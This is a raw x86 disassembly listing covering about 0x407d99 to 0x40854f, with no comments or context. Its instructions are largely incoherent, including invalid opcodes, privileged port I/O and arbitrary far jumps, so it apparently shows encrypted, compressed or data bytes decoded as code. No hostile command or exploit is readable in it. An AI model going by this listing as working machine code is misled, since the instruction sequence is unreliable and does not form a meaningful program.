  407d99:	add    al,BYTE PTR cs:[edi+0x72]
  407d9d:	test   DWORD PTR [edx-0x2a0d3cb6],ebx
  407da3:	retf   0xe06a
  407da6:	in     al,dx
  407da7:	adc    BYTE PTR [edi+0x36e3d832],bh
  407dad:	imul   edx,ebp,0x52
  407db0:	aam    0x19
  407db2:	aaa    
  407db3:	inc    edi
  407db4:	call   0xa7c1:0x1ff69c4e
  407dbb:	xor    DWORD PTR [esi+edx*4-0x11497b30],edi
  407dc2:	jmp    0x2ec7:0x9db94b08
  407dc9:	ret    0x71b4
  407dcc:	push   DWORD PTR [esi]
  407dce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407dcf:	in     al,dx
  407dd0:	dec    esp
  407dd1:	pop    esi
  407dd2:	mov    edx,0x3e9673db
  407dd7:	mov    WORD PTR [ebp+0x2c],cs
  407dda:	and    DWORD PTR [ecx-0x528079a3],esp
  407de0:	sbb    DWORD PTR [ecx-0x31],eax
  407de3:	std    
  407de4:	ja     0x407e4c
  407de6:	mov    ds:0x3356cea0,al
  407deb:	xchg   ebx,eax
  407dec:	or     bl,dl
  407dee:	cmp    eax,0xca4556ac
  407df3:	xor    BYTE PTR [ecx],cl
  407df5:	rcr    DWORD PTR [edi+0x3],1
  407df8:	stc    
  407df9:	gs std 
  407dfb:	arpl   WORD PTR [edi-0x423ddf27],sp
  407e01:	push   ebx
  407e02:	mov    dh,0xa6
  407e04:	int3   
  407e05:	sbb    ah,ah
  407e07:	in     al,0x65
  407e09:	dec    edi
  407e0a:	not    esp
  407e0c:	mov    BYTE PTR [edi+0x5e09bf9d],0x13
  407e13:	xchg   ecx,eax
  407e14:	xchg   DWORD PTR [ebp+0x17],esi
  407e17:	adc    DWORD PTR [eax],esi
  407e19:	daa    
  407e1a:	xlat   BYTE PTR ds:[ebx]
  407e1b:	cs aad 0xe9
  407e1e:	and    al,0xd9
  407e20:	sbb    bl,BYTE PTR [eax]
  407e22:	xor    eax,0x8ea81269
  407e27:	js     0x407e7f
  407e29:	inc    ebp
  407e2a:	xchg   esi,eax
  407e2b:	xor    al,0xe4
  407e2d:	mov    esi,0x89cb84eb
  407e32:	das    
  407e33:	(bad)  
  407e34:	icebp  
  407e35:	jge    0x407e6b
  407e37:	mov    edx,0xc3edb6e1
  407e3c:	and    DWORD PTR ds:0x638054ee,eax
  407e42:	push   0xffffffe9
  407e44:	loope  0x407e1f
  407e46:	aad    0x7a
  407e48:	pushf  
  407e49:	mov    eax,ds:0xe8cbf94e
  407e4e:	xor    eax,0x80798330
  407e53:	xchg   edx,eax
  407e54:	adc    BYTE PTR [edx],0xb8
  407e57:	adc    bh,ch
  407e59:	and    ax,0x65e4
  407e5d:	jecxz  0x407ded
  407e5f:	repz stc 
  407e61:	or     ebp,ebx
  407e63:	inc    eax
  407e64:	sub    esp,DWORD PTR [ebx]
  407e66:	rcl    DWORD PTR [esi],1
  407e68:	call   0x50c52fd
  407e6d:	fnstcw WORD PTR [ebp+0x498c9464]
  407e73:	in     eax,dx
  407e74:	popa   
  407e75:	(bad)  [ebx]
  407e77:	mov    ds:0xb4294821,al
  407e7c:	cmp    eax,0xf2c4bd4f
  407e81:	mov    ds:0x6285a89d,eax
  407e86:	mov    DWORD PTR [ebp-0x52],edi
  407e89:	sti    
  407e8a:	fwait
  407e8b:	cmp    esi,esp
  407e8d:	mov    al,0xbc
  407e8f:	cmp    al,0x21
  407e91:	outs   dx,BYTE PTR ds:[esi]
  407e92:	lahf   
  407e93:	loopne 0x407e2f
  407e95:	mov    ebp,0x66d12eb9
  407e9a:	jle    0x407e3a
  407e9c:	out    dx,eax
  407e9d:	or     eax,0x2d685ac0
  407ea2:	out    dx,al
  407ea3:	sub    dh,BYTE PTR [ecx-0x23c74729]
  407ea9:	mov    edi,0x41132dda
  407eae:	pop    ebp
  407eaf:	jp     0x407ee9
  407eb1:	fcomp  DWORD PTR [ecx-0x44]
  407eb4:	jns    0x407f1a
  407eb6:	fidiv  DWORD PTR [edx-0x1b]
  407eb9:	lock shl BYTE PTR [ebx-0x44b7b9e7],1
  407ec0:	fwait
  407ec1:	ins    DWORD PTR es:[edi],dx
  407ec2:	sbb    bl,ch
  407ec4:	sbb    bl,BYTE PTR [esi-0x3b]
  407ec7:	test   al,0x79
  407ec9:	repnz ins DWORD PTR es:[edi],dx
  407ecb:	mov    BYTE PTR [esi+0x5f389050],bh
  407ed1:	ins    BYTE PTR es:[edi],dx
  407ed2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ed3:	add    BYTE PTR [ebx-0x3],0x76
  407ed7:	mov    cl,0x9c
  407ed9:	add    edx,DWORD PTR ds:0xb66a0d70
  407edf:	sar    DWORD PTR [edi+0x53],cl
  407ee2:	fidivr WORD PTR [edx-0x3fc1169e]
  407ee8:	pushf  
  407ee9:	mov    ebp,0xb5563db5
  407eee:	push   esp
  407eef:	mov    ah,0x3d
  407ef1:	scas   eax,DWORD PTR es:[edi]
  407ef2:	lea    edx,[ebx+eax*2]
  407ef5:	inc    DWORD PTR [ecx+0x66]
  407ef8:	cmp    ah,dh
  407efa:	out    dx,al
  407efb:	js     0x407f60
  407efd:	and    esp,DWORD PTR [esi+0x15]
  407f00:	loop   0x407f67
  407f02:	rol    BYTE PTR [ecx-0xa41c2d0],0xbd
  407f09:	out    dx,eax
  407f0a:	or     eax,0x354ac7b6
  407f0f:	mov    al,ds:0x39bc68e0
  407f14:	cmp    DWORD PTR [ebx-0x58],esi
  407f17:	scas   eax,DWORD PTR es:[edi]
  407f18:	(bad)  
  407f19:	js     0x407f4b
  407f1b:	inc    esp
  407f1c:	mov    esi,0x961d0929
  407f21:	jno    0x407f1c
  407f23:	aad    0x28
  407f25:	jnp    0x407f47
  407f27:	xor    eax,0xfc225f92
  407f2c:	or     ebx,edx
  407f2e:	ficomp DWORD PTR ds:0x9381ced8
  407f34:	adc    BYTE PTR [esi],dh
  407f36:	xchg   ebp,eax
  407f37:	pop    ebp
  407f38:	cmp    ecx,edx
  407f3a:	xchg   esi,eax
  407f3b:	cmp    DWORD PTR [eax-0x4e54d7d3],edi
  407f41:	mov    ah,cl
  407f43:	inc    esi
  407f44:	repnz outs dx,DWORD PTR ds:[esi]
  407f46:	mov    dh,0x4c
  407f48:	sbb    eax,0x1cb4b288
  407f4d:	stc    
  407f4e:	test   eax,0x8afe1139
  407f53:	(bad)  
  407f54:	sar    ebx,0x9e
  407f57:	test   BYTE PTR [edi-0x4d],0x85
  407f5b:	faddp  st(0),st
  407f5d:	xchg   edx,eax
  407f5e:	div    DWORD PTR [edx+0x5c371ca]
  407f64:	mov    al,ds:0x2cdca52d
  407f69:	test   esp,edi
  407f6b:	and    edx,DWORD PTR [eax+edi*1-0x3aca7f69]
  407f72:	xor    edx,eax
  407f74:	pop    es
  407f75:	xchg   BYTE PTR [ecx],cl
  407f77:	xor    al,0x90
  407f79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f7a:	hlt    
  407f7b:	and    ecx,DWORD PTR [ebp-0x6e929a11]
  407f81:	mov    dh,0xcb
  407f83:	popf   
  407f84:	mov    ?,WORD PTR [edx-0x3b194975]
  407f8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f8b:	adc    eax,DWORD PTR [ecx-0x3dae83ca]
  407f91:	test   eax,0xe9cd73d7
  407f96:	mov    al,BYTE PTR [edi]
  407f98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f99:	jle    0x407fe6
  407f9b:	sub    DWORD PTR [edx+ebp*2+0x44],ebp
  407f9f:	xor    al,BYTE PTR [eax]
  407fa1:	outs   dx,BYTE PTR ss:[esi]
  407fa3:	icebp  
  407fa4:	mov    edi,0xfa9c7c19
  407fa9:	push   eax
  407faa:	push   cs
  407fab:	dec    ax
  407fad:	pusha  
  407fae:	das    
  407faf:	mov    ebp,0xf4fa08f4
  407fb4:	das    
  407fb5:	(bad)  
  407fb6:	mov    ds:0x7bd8f795,al
  407fbb:	mov    ebx,0x14ddfaa1
  407fc0:	lea    ecx,[eax]
  407fc2:	inc    esi
  407fc3:	mov    dh,0xba
  407fc5:	sti    
  407fc6:	jle    0x408002
  407fc8:	outs   dx,BYTE PTR ds:[esi]
  407fc9:	pop    es
  407fca:	in     eax,dx
  407fcb:	in     al,0x1d
  407fcd:	enter  0x79b1,0x8b
  407fd1:	mov    bh,0x4c
  407fd3:	jl     0x407fe5
  407fd5:	adc    ch,cl
  407fd7:	dec    ebp
  407fd8:	push   ebp
  407fd9:	je     0x407fdc
  407fdb:	loope  0x407f8c
  407fdd:	mov    al,ds:0xa7fde8a7
  407fe2:	imul   eax,ebp,0x30
  407fe5:	cwde   
  407fe6:	imul   edi,DWORD PTR [ebp+0x6e],0x9a0bb0fc
  407fed:	push   ebx
  407fee:	sub    BYTE PTR [edi+0x4c],0x99
  407ff2:	in     eax,0xae
  407ff4:	test   al,0x2c
  407ff6:	dec    ecx
  407ff7:	xor    edx,ebx
  407ff9:	fmul   DWORD PTR [eax]
  407ffb:	cmp    al,0x60
  407ffd:	bound  ebp,QWORD PTR [esp+eiz*8-0x4cd01a3e]
  408004:	in     al,dx
  408005:	xchg   ecx,eax
  408006:	cs jg  0x40804a
  408009:	lds    ebx,FWORD PTR [ebx+0x742561e9]
  40800f:	push   eax
  408010:	test   dl,al
  408012:	neg    DWORD PTR ds:0xb742d186
  408018:	inc    bx
  40801a:	or     edi,eax
  40801c:	inc    edx
  40801d:	cli    
  40801e:	xchg   edi,eax
  40801f:	sar    BYTE PTR [ecx-0x35],1
  408022:	inc    ebx
  408023:	or     dh,bl
  408025:	loope  0x40802c
  408027:	jne    0x40803c
  408029:	imul   ebx,DWORD PTR [esi-0xf],0xc77aaa96
  408030:	add    DWORD PTR [ecx],ecx
  408032:	jno    0x407fe1
  408034:	int3   
  408035:	adc    DWORD PTR [eax+0x1637f12],eax
  40803b:	mov    bl,0x12
  40803d:	mov    ebp,0x514f1b56
  408042:	inc    esp
  408043:	mov    es,WORD PTR [eax+esi*1]
  408046:	dec    edi
  408047:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408048:	and    edx,ecx
  40804a:	or     al,0x72
  40804c:	sti    
  40804d:	xchg   esi,eax
  40804e:	rol    DWORD PTR [ecx-0x4609f181],1
  408054:	dec    edi
  408055:	or     eax,0xee7303ae
  40805a:	cli    
  40805b:	dec    ebx
  40805c:	sub    edi,DWORD PTR ds:0x5e95d2f6
  408062:	mov    cl,0x30
  408064:	dec    edi
  408065:	inc    ecx
  408066:	sub    eax,edi
  408068:	sub    BYTE PTR [ebp-0x57],bh
  40806b:	fsubr  DWORD PTR [ebx+0x257e2aef]
  408071:	add    BYTE PTR [ebx],0x81
  408074:	nop
  408075:	xor    ah,ah
  408077:	fiadd  WORD PTR [esi]
  408079:	out    0x1e,eax
  40807b:	dec    ebp
  40807c:	xchg   esp,eax
  40807d:	stos   BYTE PTR es:[edi],al
  40807e:	pop    ebx
  40807f:	mov    ebx,?
  408081:	lds    edi,FWORD PTR [ebx+0x73]
  408084:	and    ebx,esi
  408086:	stc    
  408087:	and    BYTE PTR [esi+0x23],0x4b
  40808b:	lock xor esi,DWORD PTR [bx+si-0x69e2]
  408091:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408092:	mov    ecx,0x9baadd5a
  408097:	pop    esp
  408098:	out    dx,eax
  408099:	popa   
  40809a:	nop
  40809b:	mov    eax,0x668e7474
  4080a0:	jnp    0x408042
  4080a2:	cwde   
  4080a3:	lods   al,BYTE PTR ds:[esi]
  4080a4:	or     edx,DWORD PTR [eax+0x47]
  4080a7:	xchg   al,al
  4080a9:	or     esi,edx
  4080ab:	repz mov edx,0xe574437c
  4080b1:	sub    BYTE PTR [esi+0x463dc97a],ch
  4080b7:	cli    
  4080b8:	lods   eax,DWORD PTR ds:[esi]
  4080b9:	inc    ebp
  4080ba:	repz fwait
  4080bc:	sbb    eax,edx
  4080be:	(bad)  [ecx]
  4080c0:	sub    al,0x74
  4080c2:	sub    esi,DWORD PTR [edi+ebx*8-0x3b]
  4080c6:	ficomp WORD PTR [ebx-0x61e0a299]
  4080cc:	pop    ecx
  4080cd:	les    edx,FWORD PTR ds:0xf74c5a84
  4080d3:	jp     0x4080c1
  4080d5:	retf   0xfe8e
  4080d8:	inc    esi
  4080d9:	mov    ds:0x9a34aa95,al
  4080de:	jg     0x408092
  4080e0:	jecxz  0x4080d1
  4080e2:	jp     0x4080e8
  4080e4:	aad    0xba
  4080e6:	lea    ebx,[ebp+0x30]
  4080e9:	jmp    0x40806b
  4080eb:	pop    eax
  4080ec:	mov    bl,BYTE PTR [eax+0x4a966b92]
  4080f2:	pushf  
  4080f3:	inc    edx
  4080f4:	mov    es,WORD PTR [ecx+0x2a]
  4080f7:	xchg   edi,esp
  4080f9:	cwde   
  4080fa:	push   0xffffffda
  4080fc:	std    
  4080fd:	popf   
  4080fe:	das    
  4080ff:	fcomip st,st(3)
  408101:	or     al,0xf8
  408103:	adc    BYTE PTR [ecx+0x764e8a7d],0x1c
  40810a:	dec    eax
  40810b:	jl     0x4080bd
  40810d:	cli    
  40810e:	mov    DWORD PTR [edi-0x52c770bc],ebp
  408114:	popf   
  408115:	rol    BYTE PTR [eax-0x1],cl
  408118:	and    ch,bl
  40811a:	jecxz  0x408177
  40811c:	fcomp  DWORD PTR [edi]
  40811e:	fsub   QWORD PTR [edi]
  408120:	push   ds
  408121:	sub    bl,BYTE PTR [edx+esi*4-0x78]
  408125:	lock push es
  408127:	leave  
  408128:	cli    
  408129:	mov    ds:0xe196afcf,al
  40812e:	mov    esi,0x39564c3f
  408133:	repz sub cl,ch
  408136:	add    dl,ah
  408138:	or     eax,0x6e7f75b0
  40813d:	inc    eax
  40813e:	adc    eax,0xaf5b323e
  408143:	sbb    al,0xf9
  408145:	test   BYTE PTR [edi-0x68],bh
  408148:	add    ecx,edx
  40814a:	push   esi
  40814b:	das    
  40814c:	jo     0x4080d7
  40814e:	shl    DWORD PTR [ebx+0x20],cl
  408151:	cmp    BYTE PTR [esi],ah
  408153:	cld    
  408154:	das    
  408155:	call   0x65f3d800
  40815a:	test   BYTE PTR [ebp-0x46c2cb44],0xf1
  408161:	je     0x40810b
  408163:	cli    
  408164:	push   cs
  408165:	es out dx,al
  408167:	xchg   ebx,eax
  408168:	outs   dx,BYTE PTR ds:[esi]
  408169:	sub    DWORD PTR [ebx],eax
  40816b:	lods   eax,DWORD PTR ds:[esi]
  40816c:	lds    ebp,FWORD PTR [edx]
  40816e:	mov    al,ds:0xcfba65bc
  408173:	in     eax,dx
  408174:	dec    ecx
  408175:	gs test al,0xf5
  408178:	add    dh,BYTE PTR [ebx-0xb]
  40817b:	mov    eax,ds:0xc2b487dc
  408180:	leave  
  408181:	(bad)  
  408182:	cmp    bl,BYTE PTR [edi+0x70]
  408185:	xor    esp,DWORD PTR [edi]
  408187:	jbe    0x40816b
  408189:	sub    ebp,0x7c
  40818c:	icebp  
  40818d:	jb     0x408194
  40818f:	jb     0x4081c6
  408191:	jecxz  0x4081b9
  408193:	cmp    eax,0x96399d33
  408198:	popf   
  408199:	in     al,0x6a
  40819b:	mov    bl,0xd1
  40819d:	mov    ecx,0x5411a61a
  4081a2:	mov    bh,0x48
  4081a4:	or     BYTE PTR [ebx],ah
  4081a6:	je     0x4081a4
  4081a8:	call   0x208cda9c
  4081ad:	push   ebx
  4081ae:	call   0x73d0:0x7d9e2813
  4081b5:	jmp    0x408205
  4081b7:	out    dx,al
  4081b8:	ja     0x408236
  4081ba:	push   ss
  4081bb:	add    ah,0xe8
  4081be:	fcomi  st,st(0)
  4081c0:	(bad)  
  4081c2:	inc    ebx
  4081c3:	sbb    dl,cl
  4081c5:	fadd   QWORD PTR [edi]
  4081c7:	xchg   BYTE PTR [ebx+0x7d6ee2ed],ah
  4081cd:	dec    ebx
  4081ce:	in     eax,dx
  4081cf:	ficom  WORD PTR [edx-0xf]
  4081d2:	mov    ebx,0xfedcdcea
  4081d7:	aaa    
  4081d8:	adc    esp,ecx
  4081da:	hlt    
  4081db:	jp     0x4081ac
  4081dd:	in     al,0x2f
  4081df:	push   ds
  4081e0:	fstp   QWORD PTR [esi]
  4081e2:	lods   al,BYTE PTR ds:[esi]
  4081e3:	das    
  4081e4:	pop    esp
  4081e5:	mov    bl,0x81
  4081e7:	out    0xec,eax
  4081e9:	push   0xfffffff5
  4081eb:	pop    esp
  4081ec:	sahf   
  4081ed:	int    0xab
  4081ef:	add    ebp,DWORD PTR [edi+0x4e113827]
  4081f5:	and    eax,DWORD PTR [eax]
  4081f7:	mov    ch,0xe6
  4081f9:	cdq    
  4081fa:	sbb    eax,0x4f3d3601
  4081ff:	adc    BYTE PTR [ebp+0x14],ah
  408202:	sub    esi,DWORD PTR [ebp+edi*2-0x63df700d]
  408209:	(bad)  
  40820b:	fadd   DWORD PTR [edi+0x2f6f584c]
  408211:	int    0x95
  408213:	ins    DWORD PTR es:[edi],dx
  408214:	in     al,dx
  408215:	add    esi,DWORD PTR [ebp+esi*1-0x3e3944ac]
  40821c:	imul   eax,DWORD PTR [ebx+0x717ef7f0],0xffffff83
  408223:	mov    ch,0xd4
  408225:	dec    ebx
  408226:	lods   eax,DWORD PTR ds:[esi]
  408227:	pop    ds
  408228:	mov    ebp,0xd0535e1b
  40822d:	imul   ebp,DWORD PTR [esp+edi*4+0x1cc97369],0x77
  408235:	xor    al,0x9
  408237:	add    DWORD PTR [ecx],edi
  408239:	pop    ebx
  40823a:	out    0xe9,eax
  40823c:	xchg   esi,eax
  40823d:	jnp    0x4081c1
  40823f:	add    al,0x17
  408241:	add    bl,bh
  408243:	fwait
  408244:	and    al,0x38
  408246:	ret    
  408247:	loopne 0x408288
  408249:	xchg   DWORD PTR [ecx+0x2],eax
  40824c:	es ds jns 0x4081f3
  408250:	or     BYTE PTR [edi-0x1],ah
  408253:	add    esi,DWORD PTR [eax-0x10]
  408256:	ins    BYTE PTR es:[edi],dx
  408257:	jmp    0xebe7:0x52f2c7c
  40825e:	or     BYTE PTR fs:[ecx+eiz*2+0x29],0x6a
  408264:	mov    WORD PTR [esp-0x15],cs
  408268:	rol    BYTE PTR [edi],cl
  40826a:	xchg   esi,eax
  40826b:	mov    ah,0x37
  40826d:	inc    esi
  40826e:	push   ebx
  40826f:	in     eax,0xf4
  408271:	push   edx
  408272:	xor    BYTE PTR [esi+0x6e],0x60
  408276:	mov    ds:0x3abae559,al
  40827b:	xchg   esi,eax
  40827c:	dec    ebx
  40827d:	adc    BYTE PTR ds:0x2afad038,cl
  408283:	push   cs
  408284:	cld    
  408285:	xchg   DWORD PTR [edi+0x5a],esi
  408288:	leave  
  408289:	fnstenv [ebx+0x13]
  40828c:	jmp    0x3451b256
  408291:	pop    ecx
  408292:	enter  0x8d85,0xd9
  408296:	mov    eax,0x9744efaf
  40829b:	or     al,0xd2
  40829d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40829e:	call   DWORD PTR [edi]
  4082a0:	ror    BYTE PTR [edi],0x2f
  4082a3:	push   esi
  4082a4:	xlat   BYTE PTR ds:[ebx]
  4082a5:	cmp    eax,ebp
  4082a7:	out    0xf,al
  4082a9:	push   edx
  4082aa:	sbb    dh,bh
  4082ac:	pop    ebp
  4082ad:	cmp    esi,DWORD PTR [ebx]
  4082af:	cmp    DWORD PTR [ebx],edi
  4082b1:	idiv   BYTE PTR [ebx-0x54ee0761]
  4082b7:	scas   eax,DWORD PTR es:[edi]
  4082b8:	pop    edi
  4082b9:	sbb    edi,ecx
  4082bb:	dec    esi
  4082bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082bd:	call   0x4be99e33
  4082c2:	xchg   DWORD PTR ds:0xc649020b,eax
  4082c8:	rol    BYTE PTR ds:0x48c627d8,1
  4082ce:	xor    ebp,DWORD PTR [esi+0x25]
  4082d1:	loop   0x408332
  4082d3:	jnp    0x408283
  4082d5:	lds    ebp,FWORD PTR [bx+di-0x4327]
  4082da:	dec    edx
  4082db:	jmp    0x4082cf
  4082dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082de:	jp     0x408350
  4082e0:	js     0x40829b
  4082e2:	xlat   BYTE PTR ds:[ebx]
  4082e3:	mov    bh,0xe1
  4082e5:	test   al,0x58
  4082e7:	pop    eax
  4082e8:	lock out 0xe8,eax
  4082eb:	retf   0x6f38
  4082ee:	nop
  4082ef:	not    DWORD PTR [ebx+ebx*4-0x66a0d70e]
  4082f6:	and    edi,DWORD PTR [edx-0x11]
  4082f9:	and    BYTE PTR [esi-0x2ca06eff],al
  4082ff:	adc    al,0x22
  408301:	jmp    0x408292
  408303:	jae    0x408383
  408305:	fadd   st(1),st
  408307:	stos   DWORD PTR es:[edi],eax
  408308:	mov    eax,ds:0xd0ca1ad7
  40830d:	leave  
  40830e:	cmp    ah,BYTE PTR [esi-0x65be28d1]
  408314:	popa   
  408315:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408316:	cmc    
  408317:	pop    es
  408318:	mov    al,ds:0x967ad37c
  40831d:	cdq    
  40831e:	mov    ah,0xc3
  408320:	lds    esi,FWORD PTR [ecx-0x629347ea]
  408326:	inc    ebx
  408327:	or     bh,dh
  408329:	sar    al,cl
  40832b:	add    BYTE PTR ds:0xd4937a37,al
  408331:	xlat   BYTE PTR ds:[ebx]
  408332:	push   es
  408333:	sti    
  408334:	xchg   DWORD PTR [eax+0x37],esi
  408337:	add    eax,0xc2033e35
  40833c:	xchg   ebp,eax
  40833d:	sub    edi,esp
  40833f:	outs   dx,BYTE PTR ds:[esi]
  408340:	cmp    DWORD PTR [eax+0x7a72721],0xcf090a03
  40834a:	retf   
  40834b:	inc    esp
  40834c:	mov    ebx,0xa1d5726e
  408351:	sar    BYTE PTR [ebp+0x5db631c0],0x81
  408358:	outs   dx,BYTE PTR ds:[esi]
  408359:	in     al,dx
  40835a:	mov    esi,0x2e891b07
  40835f:	jae    0x4083ba
  408361:	or     al,0xc3
  408363:	and    al,0x0
  408365:	cli    
  408366:	shl    DWORD PTR [eax-0x7f4fd06],0xae
  40836d:	test   DWORD PTR [esi+0x64],ebp
  408370:	lea    edx,[edx+esi*4-0x80]
  408374:	scas   eax,DWORD PTR es:[edi]
  408375:	jb     0x408379
  408377:	push   0x957d7ccb
  40837c:	and    BYTE PTR [ecx],dl
  40837e:	js     0x4083f1
  408380:	mov    ah,0xee
  408382:	enter  0xc779,0x9
  408386:	adc    DWORD PTR [esi],esi
  408388:	cmp    al,0x64
  40838a:	mov    edi,DWORD PTR [esi-0x1d261851]
  408390:	jo     0x4083b7
  408392:	in     al,0x28
  408394:	pop    ss
  408395:	arpl   WORD PTR [ebp-0x51],bp
  408398:	fs (bad) 
  40839a:	icebp  
  40839b:	inc    edx
  40839c:	ss or  al,0xc7
  40839f:	dec    edi
  4083a0:	adc    eax,0x3ee3ac9d
  4083a5:	push   ss
  4083a6:	mov    bl,0xa
  4083a8:	sti    
  4083a9:	sub    cl,ah
  4083ab:	sti    
  4083ac:	icebp  
  4083ad:	or     al,0x5f
  4083af:	inc    edi
  4083b0:	fist   WORD PTR [eax]
  4083b2:	aas    
  4083b3:	call   0x7b2f22
  4083b8:	pop    ss
  4083b9:	ss mov eax,0xa62bce89
  4083bf:	and    edx,ebx
  4083c1:	imul   ebx,DWORD PTR [ebp+0x386ea39a],0x13491b14
  4083cb:	mov    ebx,0x147d229a
  4083d0:	test   BYTE PTR [edx-0x218657be],0x93
  4083d7:	adc    dl,cl
  4083d9:	inc    esi
  4083da:	dec    esi
  4083db:	xchg   ebx,eax
  4083dc:	jo     0x4083fc
  4083de:	clc    
  4083df:	pop    esp
  4083e0:	mov    ch,0x3c
  4083e2:	sub    esp,DWORD PTR [ebp-0x690926f2]
  4083e8:	psrlw  mm5,mm5
  4083eb:	repnz (bad) 
  4083ef:	fcmovbe st,st(4)
  4083f1:	aaa    
  4083f2:	inc    ebp
  4083f3:	push   es
  4083f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083f5:	or     al,0x43
  4083f7:	xchg   esi,eax
  4083f8:	stos   BYTE PTR es:[edi],al
  4083f9:	xchg   ebx,eax
  4083fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083fb:	(bad)  
  4083fc:	retf   0xf2a1
  4083ff:	mov    ah,BYTE PTR [esi+0x2a]
  408402:	outs   dx,DWORD PTR ds:[esi]
  408403:	sub    DWORD PTR [eax],esp
  408405:	dec    BYTE PTR [ebx+0x5d]
  408408:	mov    eax,ds:0xbe72b082
  40840d:	fld    QWORD PTR [ecx+0xec26b27]
  408413:	sbb    BYTE PTR [edi-0x46],ch
  408416:	xchg   ebp,eax
  408417:	fbstp  TBYTE PTR [ecx-0x1f7f2da9]
  40841d:	mov    ebx,0xde716e32
  408422:	pop    ss
  408423:	cld    
  408424:	mov    dl,0x8
  408426:	dec    edx
  408427:	fwait
  408428:	xchg   edi,eax
  408429:	sbb    al,0x6c
  40842b:	adc    cl,BYTE PTR [eax]
  40842d:	xor    bh,BYTE PTR [esi]
  40842f:	mov    esp,DWORD PTR [edx+0x42]
  408432:	or     al,0x12
  408434:	outs   dx,DWORD PTR cs:[esi]
  408436:	adc    BYTE PTR [ecx],ch
  408438:	cdq    
  408439:	int3   
  40843a:	adc    al,bh
  40843c:	nop
  40843d:	mov    edi,0x917558e7
  408442:	xchg   ecx,eax
  408443:	cmp    edx,DWORD PTR [edi+0x60]
  408446:	or     eax,0x68646ca1
  40844b:	scas   eax,DWORD PTR es:[edi]
  40844c:	aaa    
  40844d:	sub    ch,ah
  40844f:	cli    
  408450:	pop    es
  408451:	xor    esp,ebx
  408453:	add    DWORD PTR [edx],eax
  408455:	mov    eax,ds:0x94639882
  40845a:	or     al,0x14
  40845c:	(bad)  [ecx+ecx*1]
  40845f:	xor    DWORD PTR [ebx+0x24],0xa9e449d1
  408466:	iret   
  408467:	cmp    DWORD PTR [eax],edx
  408469:	add    DWORD PTR [ebx-0x3d924871],ecx
  40846f:	push   ebx
  408470:	arpl   WORD PTR [esi+0x5f],sp
  408473:	dec    esp
  408474:	rcl    al,cl
  408476:	cmc    
  408477:	(bad)  
  408478:	mov    ecx,0x72d112c6
  40847d:	ds pop esi
  40847f:	lods   al,BYTE PTR ds:[esi]
  408480:	xlat   BYTE PTR ds:[ebx]
  408481:	jno    0x408457
  408483:	push   ss
  408484:	adc    cl,bl
  408486:	retf   
  408487:	sbb    ebp,DWORD PTR ss:[ebx]
  40848a:	mov    al,ds:0xbb2450c0
  40848f:	call   0xb54dd682
  408494:	outs   dx,DWORD PTR ds:[esi]
  408495:	sahf   
  408496:	ds (bad) 
  408498:	jmp    0x4084fb
  40849a:	pop    ecx
  40849b:	jnp    0x4084fa
  40849d:	inc    edx
  40849e:	add    BYTE PTR [esi+0x346ad412],dl
  4084a4:	ret    
  4084a5:	mov    bh,0xdf
  4084a7:	push   esi
  4084a8:	dec    edi
  4084a9:	push   cs
  4084aa:	mov    eax,ds:0xffb244a
  4084af:	ds mov bl,0x84
  4084b2:	int3   
  4084b3:	mov    ecx,0xde227d06
  4084b8:	jbe    0x4084e2
  4084ba:	stc    
  4084bb:	push   edi
  4084bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084bd:	and    DWORD PTR [edi],esp
  4084bf:	xor    DWORD PTR [ebx+esi*2],esi
  4084c2:	and    esp,esi
  4084c4:	inc    eax
  4084c5:	and    al,0xc1
  4084c7:	loopne 0x40850c
  4084c9:	and    BYTE PTR [esi+esi*4],ch
  4084cc:	jo     0x408515
  4084ce:	mov    ds:0xe31f40db,eax
  4084d3:	push   ebx
  4084d4:	jbe    0x408456
  4084d6:	outs   dx,DWORD PTR ds:[esi]
  4084d7:	js     0x40852a
  4084d9:	sub    al,0x2f
  4084db:	imul   ecx,DWORD PTR [edi],0xfffffff6
  4084de:	icebp  
  4084df:	and    DWORD PTR [edi-0x6e],ebx
  4084e2:	fsubr  QWORD PTR [eax-0x65]
  4084e5:	mov    al,ds:0x9aacbfd9
  4084ea:	nop
  4084eb:	pop    ecx
  4084ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084ed:	xlat   BYTE PTR ds:[ebx]
  4084ee:	aad    0x67
  4084f0:	sti    
  4084f1:	out    dx,al
  4084f2:	sub    eax,0x39b2beeb
  4084f7:	jb     0x408540
  4084f9:	int3   
  4084fa:	into   
  4084fb:	xchg   DWORD PTR [ecx-0x7e284004],edi
  408501:	test   eax,0x993b8dae
  408506:	mov    edi,0x8622fe35
  40850b:	jne    0x40852e
  40850d:	pushf  
  40850e:	xlat   BYTE PTR ds:[ebx]
  40850f:	or     dh,cl
  408511:	in     al,dx
  408512:	xor    al,0xb3
  408514:	dec    ebx
  408515:	pop    ecx
  408516:	rcr    DWORD PTR [ebx+0x54],cl
  408519:	push   ebx
  40851a:	xor    ah,ah
  40851c:	fcom   st(7)
  40851e:	rol    BYTE PTR [edi+ebx*8-0x5ddb804d],0x54
  408526:	jb     0x4084f8
  408528:	mov    edi,0xe8b1a43c
  40852d:	add    esp,esp
  40852f:	dec    ebx
  408530:	test   DWORD PTR [esi+ecx*1+0x2c],0x7d6e09b1
  408538:	clc    
  408539:	imul   esi,DWORD PTR [ebx],0xffffff8c
  40853c:	and    esi,DWORD PTR [edi*4-0x39dd02cc]
  408543:	pop    ebx
  408544:	fstp   DWORD PTR [esi+0x37]
  408547:	mov    bh,0x6e
  408549:	jae    0x4084e8
  40854b:	jne    0x408577
  40854d:	push   esp
  40854e:	ins    BYTE PTR es:[edi],dx
  40854f:	cmp    DWORD PTR [eax-0x3b93631c],0x51834151
